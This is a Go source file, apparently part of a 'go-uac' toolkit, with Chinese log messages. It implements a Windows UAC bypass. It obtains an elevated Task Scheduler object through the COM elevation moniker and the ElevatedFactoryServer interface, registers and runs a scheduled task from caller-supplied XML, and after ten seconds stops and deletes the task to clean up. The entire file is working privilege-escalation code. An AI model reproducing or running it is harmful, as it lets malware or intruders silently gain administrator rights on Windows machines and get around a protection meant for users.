package method

import (
	"go-uac/ole"
	"log"
	"syscall"
	"time"
)

func RunTaskService(path, name, xmlText string) error {
	ole.CoInitializeEx(0, 2)
	defer ole.CoUninitialize()

	bindOpts := &ole.BIND_OPTS3{
		ClassContext: 4,
	}

	efs, err := ole.CoGetObject[*ole.IElevatedFactoryServer[*ole.ITaskService]](
		"Elevation:Administrator!new:{A6BFEA43-501F-456F-A845-983D3AD7B8F0}",
		bindOpts,
		ole.NewGUID("{804bd226-af47-4d71-b492-443a57610b08}"),
	)

	if err.IsFailed() {
		return err
	}
	defer efs.Release()

	taskService, err := efs.ServerCreateElevatedObject(
		ole.NewGUID("{0f87369f-a4e5-4cfc-bd3e-73e6154572dd}"),
		ole.NewGUID("{2FABA4C7-4DA9-4013-9697-20CC3FD40F85}"),
	)

	if err.IsFailed() {
		return err
	}

	if taskService == nil {
		return syscall.Errno(0x0E)
	}
	defer taskService.Release()

	varDummy := ole.VARIANT{}

	if err = ole.VariantInit(&varDummy); err.IsFailed() {
		return err
	}
	defer ole.VariantClear(&varDummy)

	if err = taskService.Connect(varDummy, varDummy, varDummy, varDummy); err.IsFailed() {
		return err
	}

	bstrPath := ole.SysAllocString(path)
	defer ole.SysFreeString(bstrPath)

	taskFolder, err := taskService.GetFolder(bstrPath)
	if err.IsFailed() || taskFolder == nil {
		return err
	}
	defer taskFolder.Release()

	bstrName := ole.SysAllocString(name)
	defer ole.SysFreeString(bstrName)

	bstrXmlText := ole.SysAllocString(xmlText)
	defer ole.SysFreeString(bstrXmlText)

	registeredTask, err := taskFolder.RegisterTask(bstrName, bstrXmlText, 0, varDummy, varDummy, 3, varDummy)

	// 判断任务是否已经存在
	if err.IsErr(syscall.ERROR_ALREADY_EXISTS) {
		// 存在则: 停止任务, 删除任务, 创建任务
		log.Println("任务已存在")
		registeredTask, err = taskFolder.GetTask(bstrName)
		if err.IsSuccesed() {
			log.Println("已找到任务")
			err = registeredTask.Stop(0)
			log.Println("停止任务:", err)
			err = ole.HResult(registeredTask.Release())
			log.Println("释放任务:", err)
			err = taskFolder.DeleteTask(bstrName, 0)
			log.Println("删除任务:", err)
		}

		log.Println("正在创建任务")
		registeredTask, err = taskFolder.RegisterTask(bstrName, bstrXmlText, 0, varDummy, varDummy, 3, varDummy)
	}

	if err.IsFailed() || registeredTask == nil {
		log.Println("任务创建失败", err)
		return err
	}
	defer registeredTask.Release()

	// 最后 运行任务
	runningTask, err := registeredTask.Run(varDummy)
	if err.IsFailed() || runningTask == nil {
		log.Println("任务启动失败", err)
		return err
	}
	defer runningTask.Release()

	state, err := runningTask.GetState()

	if err.IsSuccesed() && state == ole.TASK_STATE_RUNNING {
		log.Println("任务启动成功")
		log.Println("10秒后停止并清理任务")
		time.Sleep(time.Second * 10)
	}

	err = runningTask.Stop()
	log.Println("[清理]正在停止任务", err)
	taskFolder.DeleteTask(bstrName, 0)
	log.Println("[清理]正在删除任务", err)

	return nil
}
